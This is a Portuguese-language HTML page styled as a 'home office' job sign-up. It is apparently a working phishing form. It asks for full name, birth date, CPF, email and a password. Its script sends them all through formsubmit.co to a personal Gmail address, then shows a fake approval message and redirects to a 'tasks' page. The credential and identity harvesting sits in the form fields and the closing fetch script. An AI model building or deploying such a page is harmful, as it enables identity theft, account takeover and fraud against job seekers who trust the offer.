<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Cadastro Profissional</title>

  <!-- Script do OneSignal básico -->
  <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
  <script>
    window.OneSignalDeferred = window.OneSignalDeferred || [];
    OneSignalDeferred.push(async function(OneSignal) {
      await OneSignal.init({
        appId: "8ea3b56c-7d49-4126-8c52-b113d0a7f42d",
      });
    });
  </script>

  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #83a4d4, #b6fbff);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .container {
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 420px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #333;
    }
    label {
      display: block;
      margin-top: 12px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 14px;
      margin-top: 20px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
    .carregando, .mensagem-final {
      display: none;
      text-align: center;
      margin-top: 20px;
    }
    .barra {
      width: 100%;
      background-color: #ddd;
      border-radius: 10px;
      overflow: hidden;
      height: 20px;
      margin-top: 20px;
    }
    .progresso {
      height: 100%;
      width: 0%;
      background-color: #007bff;
      animation: carregar 3s linear forwards;
    }
    @keyframes carregar {
      0% { width: 0%; }
      100% { width: 100%; }
    }
  </style>
</head>
<body>

<div class="container">
  <h2>Comece agora como Home Office</h2>

  <form id="formulario">
    <label for="nome">Nome completo</label>
    <input type="text" id="nome" name="nome" required>

    <label for="data">Data de nascimento</label>
    <input type="date" id="data" name="data_nascimento" required>

    <label for="cpf">CPF</label>
    <input type="text" id="cpf" name="cpf" required>

    <label for="email">E-mail</label>
    <input type="email" id="email" name="email_usuario" required>

    <label for="senha">Senha</label>
    <input type="password" id="senha" name="senha" required>

    <label for="confirmarSenha">Confirmar senha</label>
    <input type="password" id="confirmarSenha" name="confirmar_senha" required>

    <p style="font-size: 13px; color: #555; margin-top: 10px;">
      Após concluir o cadastro, você será automaticamente incluído em nosso grupo exclusivo no Instagram.
    </p>

    <button type="submit">Enviar cadastro</button>
  </form>

  <div class="carregando" id="carregando">
    <p>Enviando informações...</p>
    <div class="barra">
      <div class="progresso"></div>
    </div>
  </div>

  <div class="mensagem-final" id="mensagemFinal">
    <h3>✅ Cadastro Concluído</h3>
    <p>Seu acesso foi liberado!<br>Você será redirecionado em instantes para as tarefas disponíveis.</p>
  </div>
</div>

<script>
  document.getElementById("formulario").addEventListener("submit", function(e) {
    e.preventDefault();

    const senha = document.getElementById("senha").value;
    const confirmarSenha = document.getElementById("confirmarSenha").value;

    if (senha !== confirmarSenha) {
      alert("As senhas não coincidem.");
      return;
    }

    const form = e.target;
    const formData = new FormData(form);

    form.style.display = "none";
    document.getElementById("carregando").style.display = "block";

    fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
      method: "POST",
      body: formData,
      headers: {
        'Accept': 'application/json'
      }
    })
    .then(response => {
      if (response.ok) {
        setTimeout(() => {
          document.getElementById("carregando").style.display = "none";
          document.getElementById("mensagemFinal").style.display = "block";

          setTimeout(() => {
            window.location.href = "https://tarefass.github.io/tarefas-/";
          }, 3000);

        }, 3000);
      } else {
        throw new Error('Erro ao enviar');
      }
    })
    .catch(error => {
      alert("Ocorreu um erro ao enviar o formulário.");
      form.style.display = "block";
      document.getElementById("carregando").style.display = "none";
    });
  });
</script>

</body>
</html>
